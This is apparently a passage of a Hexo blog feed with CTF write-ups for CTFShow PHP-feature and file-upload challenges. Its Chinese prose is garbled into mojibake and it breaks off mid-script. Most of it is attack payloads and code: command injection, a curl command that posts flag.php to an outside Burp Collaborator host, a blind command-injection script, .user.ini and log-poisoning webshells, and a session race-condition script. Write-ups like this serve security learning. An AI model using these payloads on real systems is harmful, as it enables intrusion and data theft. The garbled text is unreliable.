class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>106</strong></p><p>æ„é€ æ•°ç»„æˆ–å¼±ç›¸ç­‰ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>107</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">parse_strå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡<span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"x=1&amp;y=2"</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æ­¤æ—¶<span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span>ä¸º<span class="token number">1</span>ï¼Œ<span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">]</span>ä¸º<span class="token number">2</span>paylaod<span class="token punctuation">:</span><span class="token operator">?</span>v3<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span>v1<span class="token operator">=</span>flag<span class="token operator">=</span>c4ca4238a0b923820dcc509a6f75849b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>108</strong></p><p>æ­£åˆ™è¡¨è¾¾å¼%00æˆªæ–­ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šåŒ¹é…%00ä¹‹å‰çš„å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">strrev()&#x2F;&#x2F;åè½¬å­—ç¬¦ä¸²intval()&#x2F;&#x2F;å–æ•´æ•°payload:?c&#x3D;a%00778<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>109</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ„é€ ä½¿å¾—v1åç§°çš„ç±»å­˜åœ¨åé¢ä»»æ„æ„é€ å³å¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>110</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">FilesystemIteratorç±»çš„ä½¿ç”¨$a&#x3D;new FilesystemIterator(getcwd());while($a-&gt;valid())&#123;  echo $a-&gt;getFilename().&quot;\n&quot;;  $a-&gt;next();&#125;è¿­ä»£è¾“å‡ºå½“å‰ç›®å½•ä¸‹çš„å†…å®¹getcwd()&#x2F;&#x2F;å–å¾—å½“å‰å·¥ä½œç›®å½•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>111</strong></p><p>v1è¦åœ¨æ­£åˆ™ä¸­ç­‰äºctfshowï¼Œæ‰§è¡Œçš„è¯­å¥å°±æ˜¯</p><pre class="line-numbers language-none"><code class="language-none">$ctfshow&#x3D;&amp;$(v2çš„å€¼);var_dump($ctfshow);ç›¸å½“äºæ‰§è¡Œäº†var_dump($(v2çš„å€¼));ä»¤v2&#x3D;GLOBALSè¶…å…¨å±€å˜é‡å³å¯å°†æ‰€æœ‰å˜é‡æ‰“å°payload:?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>112</strong></p><pre class="line-numbers language-none"><code class="language-none">URLäºŒæ¬¡ç¼–ç ï¼Œé¢˜ç›®ä¸­æŠŠbase64æ»¤è¿‡äº†ï¼Œå¯¹bè¿›è¡ŒäºŒæ¬¡URLç¼–ç å³å¯ï¼Œä¼ å…¥phpæ—¶è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œè°ƒç”¨phpä¼ªåè®®æ—¶å†æœ‰ä¸€æ¬¡<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>113</strong></p><p>å‹ç¼©æµè¯»å–</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;compress.zlib:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>114</strong></p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>115</strong></p><p>åœ¨æ•°å­—å‰åŠ ä¸Šç©ºæ ¼ï¼Œä¹Ÿä¼šè¢«is_numericå‡½æ•°è®¤ä¸ºæ˜¯æ•°å­—</p><p>trimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ<code>\n\r\t\v\0</code>ï¼Œä½†ä¸ä¼šè¿‡æ»¤<code>\f</code></p><p>æœ€ç»ˆpayload:urlencode(â€œ\fâ€.36)</p><p><strong>123</strong></p><pre class="line-numbers language-none"><code class="language-none">PHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼ï¼Œ+ï¼Œ.ï¼Œ[è½¬æ¢ä¸º_ï¼Œä½†æ˜¯å½“æœ‰ç‰¹æ®Šå­—ç¬¦[æ—¶ï¼Œåé¢çš„å†…å®¹ä¸­å°±ä¸ä¼šæ›¿æ¢äº†payload:POST:CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>125</strong></p><pre class="line-numbers language-none"><code class="language-none">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;var_export(get_defined_vars())CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;highlight_file($_GET[1])?1&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>126</strong></p><pre class="line-numbers language-none"><code class="language-none">1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[&#39;argv&#39;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°2ã€webç½‘é¡µæ¨¡å¼ä¸‹åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹è®¾ç½®register_argc_argv &#x3D; On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœè¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] &#x3D; $_SERVER[â€˜QUERY_STRINGâ€™]&#x2F;&#x2F;è¿™é‡Œçš„è¿™ä¸ªå‚æ•°å°±æ˜¯GETè¯·æ±‚ä¸­?åçš„å†…å®¹$argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:?$fl0g&#x3D;flag_give_me;CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>127</strong></p><p>å‰é¢çš„è‡ªåŠ¨è½¬æ¢å’¯</p><p><strong>128</strong></p><pre class="line-numbers language-none"><code class="language-none">å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°_()&#x3D;&#x3D;gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dllget_defined_vars()å‡½æ•°get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flagpayload: ?f1&#x3D;_&amp;f2&#x3D;get_defined_vars<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>129</strong></p><p>ç›®å½•ç©¿è¶Š</p><pre class="line-numbers language-none"><code class="language-none">payload:?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>130</strong></p><p>æ­£åˆ™/.+?ctfshow/is</p><p>stripos($f, â€˜ctfshowâ€™) === FALSE</p><p>striposè¿”å›ä½ç½®ä»0å¼€å§‹ï¼ŒæœªæŸ¥æ‰¾åˆ°æ‰è¿”å›falseï¼Œåœ¨ä¸¥æ ¼ç›¸ç­‰ä¸­ä¸ç›¸ç­‰</p><p>ç›´æ¥ç»•</p><p>f=ctfshow</p><p><strong>131</strong></p><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ­£åˆ™æº¢å‡º</a></p><p>ä¼ ä¸ªè¶…è¿‡ä¸€ç™¾ä¸‡é•¿åº¦çš„å­—ç¬¦å°±å¥½å•¦</p><pre class="line-numbers language-none"><code class="language-none">f&#x3D;&#39;kkkk&#39;*250000+&#39;36Dctfshow&#39;#pythonçœŸå¥½ç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>132</strong></p><p>robots.txtè¿›admin</p><p>å¯¹äºâ€œä¸â€ï¼ˆ&amp;&amp;ï¼‰ è¿ç®—ï¼š x &amp;&amp; y å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼›</p><p>å¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š x||y å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyã€‚</p><p>åœ¨åˆ¤æ–­è¿™ä¸ªçš„æ—¶å€™if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===â€adminâ€) ç¬¬ä¸€ä¸ª$code === mt_rand(1,0x36D)ä¸ºfalse,ä¹‹åå°±æ‰§è¡Œ|| $username ===â€adminâ€</p><p>åé¢æœ‰æˆ–ï¼Œæ‰€ä»¥æ»¡è¶³username===â€™adminâ€™å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:&#x2F;admin&#x2F;?code&#x3D;admin&amp;password&#x3D;&amp;username&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>133</strong></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">éªšæ“ä½œ</a></p><pre class="line-numbers language-none"><code class="language-none">æˆ‘ä»¬ä¼ é€’?F&#x3D;&#96;$F&#96;;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„&#96;$F&#96;;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ&#96;&#96;æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„&#96;$F&#96;;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯&#96;$F&#96;;$Få˜é‡å†…å®¹å°±æ˜¯æˆ‘ä»¬æœ€ç»ˆæ‰§è¡Œçš„å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ä¸€æŠŠburpè‡ªå¸¦çš„åŠŸèƒ½ï¼ŒBurp Collaboratorï¼Œç›¸è¾ƒäºDNSLogçš„å¥½å¤„å°±æ˜¯å¯ä»¥å¸¦å‡ºPOSTä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æºå¸¦Cookie</p><p>è¿˜æœ‰curlå‘½ä»¤çš„ä½¿ç”¨</p><pre class="line-numbers language-none"><code class="language-none">payload:?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-09">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-09</a> 15.18.07.png)</p><p><strong>134</strong></p><p>phpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><pre class="line-numbers language-none"><code class="language-none">payload: ?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>135</strong></p><p>åŒä¹‹å‰æˆ–è€…ç›´æ¥mvæ”¹å</p><pre class="line-numbers language-none"><code class="language-none">payload:?F&#x3D;&#96;$F&#96;;+mv flag.php flag.txt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>136</strong></p><p>banäº†ä¸€å †å‘½ä»¤ï¼Œéœ€è¦å›æ˜¾ï¼Œä½¿ç”¨Linux teeå‘½ä»¤</p><p>Teeæ˜¯Linuxå‘½ä»¤ï¼Œç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><pre class="line-numbers language-none"><code class="language-none">å‘½ä»¤|tee è¾“å‡ºæ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac &#x2F;f149_15_h3r3|tee 1æŸ¥çœ‹&#x2F;1æ–‡ä»¶å³å¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>137</strong></p><p>call_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•æ—¶ï¼Œä½¿ç”¨::å¦‚class::function</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctfshow&#x3D;ctfshow::getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>138</strong></p><p>è°ƒç”¨è¿˜èƒ½ä¼ æ•°ç»„</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>139</strong></p><p>è‡ªåŠ¨è·³è½¬æˆ‘è°¢è°¢ä½ å•Š</p><p>æˆ‘æ˜¯çœŸå¦¹æƒ³åˆ°è¿™ç©æ„è¿˜èƒ½ç›²æ³¨</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#è·å–å°å†™å­—æ¯ä¸æ•°å­—result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):print(j)if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))#time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´except:    result&#x3D;result+n    print(result)    break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>140</strong></p><p>intvalæŠŠå­—ç¬¦ä¸²è½¬æˆ0ï¼Œ0==â€™å­—ç¬¦ä¸²â€™ç»“æœä¸ºçœŸ</p><p>æ‰¾ä¿©å‡½æ•°è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²å°±è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTf1&#x3D;md5&amp;f2&#x3D;phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>141</strong></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">ç»•è¿‡æ— å­—æ¯æ•°å­—æ–¹æ³•</a></p><p>ä½¿ç”¨å–åæ³•</p><pre class="line-numbers language-none"><code class="language-none">payloadï¼š?v1&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>142</strong></p><p>å„ç§è¿›åˆ¶å–é›¶å°±è¡Œ</p><p><strong>143</strong></p><p>è¿‡æ»¤äº†å–åå­—ç¬¦ï¼Œ</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFShowæ–‡ä»¶ä¸Šä¼ </title>
      <link href="/posts/2824.html"/>
      <url>/posts/2824.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p><strong>151</strong></p><p>å‰ç«¯æ ¡éªŒï¼Œç›´æ¥ç»•è¿‡</p><p><strong>152</strong></p><p>Content/Typeæ ¡éªŒï¼Œç›´æ¥ç»•è¿‡</p><p><strong>153</strong></p><p>æ–‡ä»¶åç¼€åæ ¡éªŒï¼Œå°è¯•ä½¿ç”¨php5,phtmlç­‰æ–‡ä»¶å¤±è´¥ï¼Œåº·åº·wpå­¦ä¹ æ–°çŸ¥è¯†ï¼ŒæŸ¥çœ‹å“åº” å¤´å‘ç°ä¸­é—´ä»¶æ˜¯nginx</p><pre class="line-numbers language-none"><code class="language-none">nginxä¸­å’Œapacheçš„.htacessæœ‰ç›¸åŒä½œç”¨çš„æ–‡ä»¶æ˜¯.user.iniï¼Œè¿›ä¸€æ­¥æ‹“å±•ï¼Œphpä¸­çš„é»˜è®¤é…ç½®æ–‡ä»¶å®ä¸ºphp.iniï¼Œè€Œphp.iniæœ‰å››ç§é…ç½®æ¨¡å¼PHP_INI_USERå¯ä»¥åœ¨user.iniä¸­è®¾å®šPHP_INI_PERDIRå¯ä»¥åœ¨php.ini,.htacess,httpd.confä¸­è®¾å®šPHP_INI_SYSTEMå¯ä»¥åœ¨php.ini,httpd.confä¸­è®¾å®šPHP_INI_ALLéšæ„è®¾å®šå¹¶ä¸”é™¤äº†php.iniæ–‡ä»¶ä¹‹å¤–ï¼Œphpè¿˜ä¼šä»å½“å‰ç›®å½•åˆ°webæ ¹ç›®å½•ä¸‹é€çº§æœç´¢iniæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ä¸–çºªæ“ä½œä¸­é™¤äº†PHP_INI_SYSTEMä¸­çš„å†…å®¹éƒ½å¯ä»¥é€šè¿‡.user.iniè¿›è¡Œè®¾å®šé‚£ä¹ˆuser.iniä¸­å®é™…æœ‰ç”¨çš„é…ç½®é¡¹æœ‰ä¸¤ä¸ªï¼šauto_append_file &#x2F;&#x2F;åœ¨php4.2.3åŠä»¥å‰æ˜¯PHP_INI_ALLé‡Œé¢çš„ï¼Œåé¢å˜æˆäº†PHP_INI_PERDIDauto_prepend_fileè¿™ä¸¤é¡¹çš„åŠŸèƒ½æ˜¯åˆ¶å®šä¸€ä¸ªæ–‡ä»¶åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶ä¹‹å&#x2F;ä¹‹å‰ï¼Œç±»ä¼¼å¸®åŠ©åŸå§‹æ–‡ä»¶æ·»åŠ ä¸€ä¸ªrequire(æŸæ–‡ä»¶)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯å°†æœ¨é©¬ä¸Šä¼ åå†ä¸Šä¼ .user.iniè®¾ç½®åŒ…å«æœ¨é©¬å³å¯</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;.user.iniauto_prepend_file &#x3D; shell.png&#x2F;&#x2F;shell.png@eval($_POST[&#39;kkk&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>154</strong></p><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†phpï¼Œå¤§å°å†™ç»•è¿‡</p><p><strong>155</strong></p><p>ä¸¥æ ¼è¿‡æ»¤phpï¼Œæ‰€ä»¥å¤§å°å†™è¿‡ä¸å»äº†ï¼ŒçŸ­æ ‡ç­¾ç»•è¿‡</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">å½“phpå‚æ•°:short_open_tag &#x3D; Onæ—¶ï¼Œphpå¯ä»¥è§£æçŸ­æ ‡ç­¾å†…å®¹phpä¸­å¸¸è§çš„å››ç§æ ‡ç­¾çš„å†™æ³•ï¼š&lt;?php echo &quot;CTF&quot;; ?&gt;&lt;? echo &quot;CTF&quot;; ?&gt;&#x2F;&#x2F;short_open_tag &#x3D; On&lt;% echo &quot;CTF&quot;; %&gt;&#x2F;&#x2F;è¿™ç§å†™æ³•åœ¨phpé…ç½®ä¸­é»˜è®¤å…³é—­äº†çš„ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å‡ºä¸€è¡Œ3.å¦‚æœè¦æ­£å¸¸è¾“å‡ºï¼Œéœ€è¦é…ç½®php.iniæ–‡ä»¶ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°asp_tags&#x3D;off ,å°†offæ”¹ä¸ºonã€‚æ”¹åŠ¨é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯apacheã€‚ &lt;script language&#x3D;&quot;php&quot;&gt; echo &quot;CTF&quot;; &lt;&#x2F;script&gt;è¿˜æœ‰ä¸€ç§ç¥å¥‡å†™æ³•ä»¥åä¼šç”¨åˆ°&lt;?&#x3D;(è¡¨è¾¾å¼)?&gt;  ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt; &#x2F;&#x2F;æ— é™åˆ¶  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>156</strong></p><p>è¿‡æ»¤äº†<code>[  ]</code>ï¼Œå¯ç”¨<code>&#123;  &#125;</code>ä»£æ›¿</p><p><strong>157</strong></p><p>è¿‡æ»¤äº†åˆ†å·å’ŒèŠ±æ‹¬å·ï¼Œç”¨ä¸Šé¢çš„ç¥å¥‡å†™æ³•ç›´æ¥æ‰§è¡Œ<code>&lt;?=(system(&#39;tac ../flag.???&#39;))?&gt;</code> </p><p><strong>158</strong></p><p>åŒä¸Š</p><p><strong>159</strong></p><p>systemè²Œä¼¼æ²¡äº†ï¼Œç”¨<code>&lt;?=nl ``../fl*``?&gt;</code></p><p><strong>160</strong></p><p>åå¼•å·éƒ½æ²¡äº†ï¼Œåªèƒ½å°è¯•åŒ…å«è®¿é—®æ—¥å¿—äº†</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;shell.png&lt;?include&quot;&#x2F;var&#x2F;lo&quot;.&quot;g&#x2F;nginx&#x2F;access.lo&quot;.&quot;g&quot;?&gt;&#x2F;&#x2F;ç©ºæ ¼éƒ½æ²¡ç»™ç•™å°±ç¦»è°±&#x2F;&#x2F;User-Agent&lt;?php eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>161</strong></p><p>å¢åŠ äº†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œå…¶ä½™åŒä¸Š</p><p><strong>162</strong></p><p>.å’Œflagè¢«è¿‡æ»¤ï¼Œsessionæ–‡ä»¶çš„ç«äº‰åŒ…å«ï¼Œéš”å£æ–‡ä»¶åŒ…å«æœ‰åŸå› </p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&#x2F;&#x2F;.user.iniauto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_kkk&#x2F;&#x2F;1&lt;?&#x3D;include&quot;&#x2F;tmp&#x2F;sess_kkk&quot;?&gt;&#x2F;&#x2F;POC.html&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;é“¾æ¥&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>sess <span class="token operator">=</span> <span class="token string">'j1an'</span>url1 <span class="token operator">=</span> <span class="token string">"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/"</span>url2 <span class="token operator">=</span> <span class="token string">"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload"</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php system("tac ../f*");?>'</span><span class="token punctuation">&#125;</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'j1an'</span><span class="token punctuation">&#125;</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token 